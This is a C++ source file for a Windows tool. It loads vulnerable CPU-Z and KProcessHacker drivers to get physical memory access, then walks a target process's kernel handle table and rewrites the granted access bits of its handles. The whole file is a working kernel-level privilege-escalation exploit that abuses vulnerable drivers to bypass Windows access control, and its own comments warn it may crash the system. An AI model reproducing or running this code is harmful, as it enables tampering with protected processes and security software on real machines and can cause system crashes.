#include "jobHandlers.h"


void* HandleEntryAddress(HANDLE handle, void* tableCode, void* dirBase, Driver* driver);


/// <summary> Enumerate a processes handles </summary>
/// <param name="processID"> Process PID </param>
/// <returns></returns>
bool ElevateProcessHandles(JOBDESCRIPTOR* job)
{
	CpuzDrvr cpuz = CpuzDrvr();
	KProcessHacker kph = KProcessHacker();
	
	cpuz.InitDriver();
	kph.InitDriver();
	if (!kph.InitPhysicalMemory()) return false;

	// Reading CR3 register gives the directory base of this process
	//-------------------------------------------------------------
	ULONG64 dirBase;
	if (!cpuz.ReadControlRegister(CR_3, &dirBase)) return false;

	// Get the eprocess structure of target process
	//---------------------------------------------
	void* processEprocess = util::ProcessEprocessVirtualAddress(job->Pid());
	processEprocess = util::TranslateVirtualAddress( (void*)dirBase, processEprocess, &kph);

	// Get the Object handle table of process
	//---------------------------------------------
	nt::HANDLE_TABLE handleTable;
	void* objectTableAddr = nullptr;
	if (!kph.ReadPhysicalAddr((void*)((uint64_t)processEprocess + EPROCESS_OBJECT_TABLE_OFFSET), 
							&objectTableAddr, sizeof(void*)))
		return false;
	objectTableAddr = util::TranslateVirtualAddress((void*)dirBase, objectTableAddr, &kph);

	if (!kph.ReadPhysicalAddr(objectTableAddr, &handleTable, sizeof(handleTable)))
		return false;


	// Enumerate process handles
	//---------------------------------------------
	int handleTableType = handleTable.TableCode & 0x3;
	void* tableAddress = (void*)(handleTable.TableCode & ~0x3);
	int	sizOfTable = 0x1000 / sizeof(nt::HANDLE_TABLE_ENTRY);


	for (int i = 0; i < job->ResourceCount(); i++) {

		HANDLE_NEW_ACCESS hAccess = job->Handle(i);
		nt::HANDLE_TABLE_ENTRY handleTableEntry;

		// Get handle entry
		void* handleEntryAddress = HandleEntryAddress(hAccess.hValue, (void*)handleTable.TableCode, (void*)dirBase, &kph);
		if (!kph.ReadPhysicalAddr(handleEntryAddress, &handleTableEntry, sizeof(nt::HANDLE_TABLE_ENTRY)))
			return false;

		// elevate handle
		handleTableEntry.GrantedAccessBits = (handleTableEntry.GrantedAccessBits & 0xFE000000) | (hAccess.desiredAccess & 0x00FFFFFF);

		// Potential BSOD
		if (!kph.WritePhysicalAddr(handleEntryAddress, &handleTableEntry, sizeof(nt::HANDLE_TABLE_ENTRY)))
			return false;
	}

	std::cout << "DONE" << std::endl;

	return false;
}




void* HandleEntryAddress(HANDLE handle, void* tableCode, void* dirBase, Driver* driver) 
{

	void*		tableAddress = (void*)((uint64_t)tableCode & ~0x3);
	uint32_t	handleOffsetInTable = 0;
	uint32_t	sizeOfTable = 0x1000 / sizeof(nt::HANDLE_TABLE_ENTRY);
		
	uint32_t	hValue = (uint32_t)handle >> 2;

	switch ((uint64_t)tableCode & 0x03)
	{
		case 0:						// We got a primary table

				tableAddress = (void*)((uint64_t)tableAddress + ((uint64_t)(hValue * sizeof(nt::HANDLE_TABLE_ENTRY))));

				return util::TranslateVirtualAddress((void*)dirBase, tableAddress, driver);

			break;

		case 1:						// We got a secondary table


				// Read The Table containig handle
				//----------------------------------
				tableAddress = (void*)((uint64_t)tableAddress + (uint64_t)((hValue / sizeOfTable) * sizeof(void*)));

				tableAddress = util::TranslateVirtualAddress((void*)dirBase, tableAddress, driver);

				if (!driver->ReadPhysicalAddr(tableAddress, &tableAddress, sizeof(tableAddress)))
					return false;

				// Get the physical address of handle in table
				//----------------------------------------------
				tableAddress = (void*)((uint64_t)tableAddress + ((hValue % sizeOfTable) * sizeof(nt::HANDLE_TABLE_ENTRY)));
				return util::TranslateVirtualAddress((void*)dirBase, tableAddress, driver);

			break;

		case 2:
		case 3:						// Table is tertially

			// table of pointers to tables of pointers of tables of entries
			// Havent encountered anyone here yet so i return nullptrs
			std::cout << "Table tertially: " << std::endl;

			return nullptr;
			break;
	}

	return nullptr;
}